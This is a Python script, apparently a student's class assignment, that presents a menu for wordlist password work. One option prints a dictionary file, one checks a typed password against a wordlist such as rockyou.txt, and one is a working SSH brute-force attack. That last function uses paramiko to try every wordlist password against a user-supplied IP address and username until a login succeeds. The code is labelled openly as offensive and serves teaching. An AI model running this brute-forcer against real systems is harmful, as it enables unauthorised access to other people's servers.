#!/usr/bin/python3

#Author: Steve Cherewaty
#Date: 05/21/2024
#Purpose: Brute Force II
#Sources: https://null-byte.wonderhowto.com/how-to/sploit-make-ssh-brute-forcer-python-0161689/
# Demo Code to start & worked with Brad again last night 
# Class review and refined from - Brad and Ethan this morning as well.

import time
import paramiko
import getpass
import os 

def iterator():
# Prompt user for file path, default to 'rockyou.txt'
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"  

# Check if the file exists
    if not os.path.isfile(filepath):  
        print(f"File not found: {filepath}")  
        return  
    
    file = open(filepath, encoding="ISO-8859-1") 
 # Read the first line from the file
    line = file.readline() 
    while line:  
        line = line.rstrip()  
        word = line  
        print(word)  
        time.sleep(1)  
# Read the next line from the file
        line = file.readline()  
# Close the file
    file.close()  

def check_password():
    usr_password = getpass.getpass(prompt="Please enter a password: ") 
# Prompt user for file path, default to 'rockyou.txt' 
    usr_filepath = input("Checking the strength of that password.\nPlease enter a dictionary filepath:\n") or "rockyou.txt"  

    if not os.path.isfile(usr_filepath): 
        print(f"File not found: {usr_filepath}")  
        return  # Exit the function
    
    print(f"Checking password against the words in '{usr_filepath}', just a moment.")  # Inform the user about the check
    t1 = time.time()  # Record the start time
    file = open(usr_filepath, encoding="ISO-8859-1") 
    line = file.readline()  
    wordlist = []  
    while line:  
        line = line.rstrip()  
        word = line  
        wordlist.append(word)  
        line = file.readline()  
    file.close()  
 # Check if the password is not in the wordlist   
    if usr_password not in wordlist:  
        print("Your password is acceptable. Good job.")  # Print message if password is not found
    else:
        print("Your password was found in the dictionary. Please choose another password.")  # Print message if password is found
    t2 = time.time()  
    # Print the duration of the check
    print(f"Password check completed in {t2 - t1:.2f} seconds.")  

def brute_force_ssh():
    ip = input("Enter the target IP address:\n")
    username = input("Enter the SSH username:\n")
    filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
    
    if not os.path.isfile(filepath):
        print(f"File not found: {filepath}")
        return
    
    file = open(filepath, encoding="ISO-8859-1")
    line = file.readline()
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    while line:
        line = line.rstrip()
        password = line
        
        try:
            ssh.connect(ip, port=22, username=username, password=password, timeout=3)
            print(f"Success! Username: {username} Password: {password}")
            break
        except paramiko.AuthenticationException:
            print(f"Failed: {password}")
        except Exception as e:
            print(f"Connection error: {e}")
            break
        
        line = file.readline()
    
    file.close()
    ssh.close()

# Main
if __name__ == "__main__":  
# Start an  loop
    while True:  
        print("\nBrute Force Wordlist Attack Tool Menu")  
        print("1 - Offensive, Dictionary Iterator")  
        print("2 - Defensive, Password Recognized")  
        print("3 - Offensive, SSH Brute Force")  
        print("4 - Exit")  
# Get user input for menu option
        mode = input("Please enter a number: ")  
        
        if mode == "1":
            iterator()  
        elif mode == "2":
            check_password() 
        elif mode == "3":
            brute_force_ssh() 
        elif mode == "4":
            break  
        else:
            print("Invalid selection...") 

        
